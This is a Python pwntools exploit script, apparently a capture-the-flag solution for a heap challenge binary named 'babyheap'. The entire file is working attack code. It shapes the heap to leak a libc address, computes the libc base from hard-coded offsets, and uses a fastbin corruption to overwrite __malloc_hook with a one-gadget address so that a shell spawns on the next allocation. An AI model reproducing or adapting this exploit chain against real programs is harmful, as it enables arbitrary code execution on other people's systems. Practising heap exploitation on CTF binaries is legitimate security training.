#!/usr/bin/env python

from pwn import *

p = process('./babyheap')

def menu(c):
	p.recvuntil("choice: ")
	p.send(str(c) + '\n')


def alloc(length, content): 
	menu(1)
	p.recvuntil("please input chunk size: ")
	p.send(str(length) + '\n')
	p.recvuntil("input chunk content: ")
	p.send(content)


def show(idx):
	menu(2)
	p.recvuntil("please input chunk index: ")
	p.send(str(idx) + '\n')


def delete(idx):
	menu(3)
	p.recvuntil("please input chunk index: ")
	p.send(str(idx) + '\n')

alloc(0x100, 'A' * 0x10 + '\n')
alloc(0x100, 'A' * 0x10 + '\n')
alloc(0x100, 'A' * 0x10 + '\n')
alloc(0x100, 'A' * 0x10 + '\n')

delete(0)
delete(1)
alloc(0xf8, 'A' * 0xf8)
alloc(0x80, 'A' * 0x10 + '\n')
alloc(0x60, 'B' * 0x10 + '\n')
delete(1)
delete(2)
alloc(0x80, 'A' * 0x10 + '\n')
show(4)
p.recvuntil('content: ')
libc_addr = u64(p.recvn(6) + '\x00\x00')
libc_base = libc_addr - 0x3c4b78
malloc_hook = libc_base + 0x3c4b10
system_addr = libc_base + 0x45390
log.info("libc base: " + hex(libc_base))
alloc(0x60, 'B' * 0x10 + '\n')
alloc(0x60, 'C' * 0x10 + '\n')
delete(2)
delete(5)
delete(4)
target = malloc_hook - 0x28 + 0x05
alloc(0x60, p64(target) + '\n')
alloc(0x60, p64(target) + '\n')
alloc(0x60, p64(target) + '\n')
alloc(0x60, 'A' * 3 + p64(0x00) * 2 + p64(libc_base + 0x4526a) + '\n')
menu(1)
p.recvuntil("please input chunk size: ")
p.send(str(0x10) + '\n')
p.interactive()
